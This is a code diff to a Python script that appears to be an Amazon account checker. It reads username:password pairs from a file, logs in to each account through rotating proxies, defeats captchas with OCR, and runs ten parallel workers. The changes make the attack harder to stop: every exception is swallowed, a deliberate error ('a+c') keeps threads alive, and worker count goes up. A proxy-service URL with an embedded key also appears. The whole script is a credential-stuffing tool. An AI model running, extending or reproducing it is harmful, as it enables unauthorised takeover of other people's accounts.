@@ -646,7 +646,11 @@ def custom_captcha_callback(captcha_url: str,userinfo: str) -> str:
     if int(LOGINCOUNT[userinfo]['count']) >= 3:
         with open('fail/outcount.txt', 'a+', encoding='utf-8') as f:
             f.write(LOGINCOUNT[userinfo]['userinfo'])
-        exit()
+        # exit()
+        # return False
+        # 随机异常，让线程继续存在
+        a+c
+     
     # print(LOGINCOUNT)
     # src = cv.imread(captcha_url)
     start = time.time()
@@ -654,35 +658,39 @@ def custom_captcha_callback(captcha_url: str,userinfo: str) -> str:
     val = recognize_text(captcha_url)
     # val = getcode(captcha_url)
     end = time.time()
-    print('Running time: %s Seconds' % (end-start))
+    print('Running time: %s Seconds  CODE:%s' % (end-start,val))
 
     return val
 def authlogin(locale,user,password,myproxy,userAgent):
     myproxy="http://"+myproxy
     print(myproxy)
-    LOGINCOUNT[user] = {}
-    LOGINCOUNT[user]['count'] = 0
-    LOGINCOUNT[user]['userinfo'] = user + ':' + password + ':'+ locale + "\n"
-    auth = Authenticator.from_login(
-        username=user,
-        proxys=myproxy,
-        userAgent=userAgent,
-        password=password,
-        locale=locale,
-        captcha_callback=custom_captcha_callback,
-        otp_callback=None,
-        cvf_callback=None,
-        approval_callback=custom_approval_callback
-    )
-    # custom_captcha_callback
-    sem = asyncio.Semaphore(10)
-    asyncio.run(getinfo(auth,locale,user,myproxy,userAgent))
+    try:
+        LOGINCOUNT[user] = {}
+        LOGINCOUNT[user]['count'] = 0
+        LOGINCOUNT[user]['userinfo'] = user + ':' + password + ':'+ locale + "\n"
+        auth = Authenticator.from_login(
+            username=user,
+            proxys=myproxy,
+            userAgent=userAgent,
+            password=password,
+            locale=locale,
+            captcha_callback=custom_captcha_callback,
+            otp_callback=None,
+            cvf_callback=None,
+            approval_callback=custom_approval_callback
+        )
+        # custom_captcha_callback
+        sem = asyncio.Semaphore(10)
+        asyncio.run(getinfo(auth,locale,user,myproxy,userAgent))
+    except:
+        print('Running -except-------------------')
     # getinfo(auth,locale,user,myproxy,userAgent)
     # loop = asyncio.get_event_loop()
     # loop.run_until_complete(main(auth,locale,user,myproxy,userAgent))          
         
 def get_ip() -> str:
     # 先
+    return '127.0.0.1:7890'
     if IPQUEUE.getSize()<100:
         apiUrl="https://foortu.com/proxy/1134f1fba496dc78a93017d52bbe46a4"
         
@@ -712,15 +720,18 @@ def get_ip() -> str:
     # ip = ip_list[random.randint(0, len(ip_list)-1)]
     ip = IPQUEUE.randget()
     print('------------------'+str(IPQUEUE.getSize()))
+    return '127.0.0.1:7890'
     return ip
 
 def randget():
     from random import randrange
     IPQUEUE.rotate(randrange(0,IPQUEUE._qsize()))
     return IPQUEUE.get()
+
+
 def asyncamzon(index): 
 
-    with open('amazon.txt', 'r') as f:
+    with open('./amazon.txt', 'r',encoding='utf-8') as f:
         for i, line in enumerate(f):
             try:
                 if i % 10 == index:
@@ -768,7 +779,7 @@ if __name__ == "__main__":
     signal.signal(signal.SIGTERM, quit)
     
     p = Pool(10)
-    for i in range(5):
+    for i in range(10):
         p.apply_async(asyncamzon, args=(i,))
    
     print('Waiting for all subprocesses done...')
